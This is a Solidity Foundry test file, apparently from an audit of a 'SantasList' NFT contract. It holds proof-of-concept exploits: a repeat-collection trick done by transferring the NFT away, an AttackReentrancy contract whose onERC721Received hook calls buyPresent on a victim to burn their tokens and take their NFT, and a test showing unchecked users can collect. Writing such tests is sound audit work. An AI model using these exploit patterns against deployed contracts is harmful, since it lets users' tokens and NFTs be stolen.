// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {SantasList} from "../../src/SantasList.sol";
import {SantaToken} from "../../src/SantaToken.sol";
import {Test} from "forge-std/Test.sol";
import {_CheatCodes} from "./mocks/CheatCodes.t.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SantasListTest is Test {
    SantasList santasList;
    SantaToken santaToken;

    address user = makeAddr("user");
    address santa = makeAddr("santa");
    address constant HEVM_ADDRESS = address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));
    _CheatCodes cheatCodes = _CheatCodes(HEVM_ADDRESS);

    function setUp() public {
        vm.startPrank(santa);
        santasList = new SantasList();
        santaToken = SantaToken(santasList.getSantaToken());
        vm.stopPrank();
    }

    // 测试多次提取
    function test_collect_repeat() public {
        // 1. check one
        vm.startPrank(user);
        santasList.checkList(user, SantasList.Status.NICE);
        vm.stopPrank();

        // 2. check twice
        vm.startPrank(santa);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        // 3. 时间到达
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 4. 提取
        vm.startPrank(user);
        address temp = makeAddr("temp");
        santasList.collectPresent();
        // 通过将提取到的nft转移到其他地址，从而进行二次提取
        santasList.transferFrom(user, temp, 0);
        santasList.collectPresent();
        vm.stopPrank();
    }

    // 测试重入
    function test_erc721_reen() public {
        AttackReentrancy attackReentrancy = new AttackReentrancy(santasList, santaToken, user);

        // 1. user和attacker都通过了check
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkList(address(attackReentrancy), SantasList.Status.NICE);

        vm.startPrank(santa);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(address(attackReentrancy), SantasList.Status.NICE);
        vm.stopPrank();

        // 2. 时间到达
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 3. user提取
        vm.startPrank(user);
        santasList.collectPresent();
        vm.stopPrank();

        // 4. attacker提取
        vm.startPrank(address(attackReentrancy));
        // 在接收nft时会触发重入，而后燃烧user的token，并且将user的nft转移至自身
        santasList.collectPresent();
        vm.stopPrank();
    }

    // 测试任何用户都至少是nice
    function test_nice() public {
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
        vm.startPrank(user);
        santasList.collectPresent();
        vm.stopPrank();
    }
}

contract AttackReentrancy is IERC721Receiver {
    SantasList santasList;
    SantaToken santaToken;
    address victim;

    bool flag;

    constructor(SantasList _santasList, SantaToken _santaToken, address _victim) {
        santasList = _santasList;
        santaToken = _santaToken;
        victim = _victim;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        if (!flag) {
            flag = true;
            santasList.buyPresent(victim);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
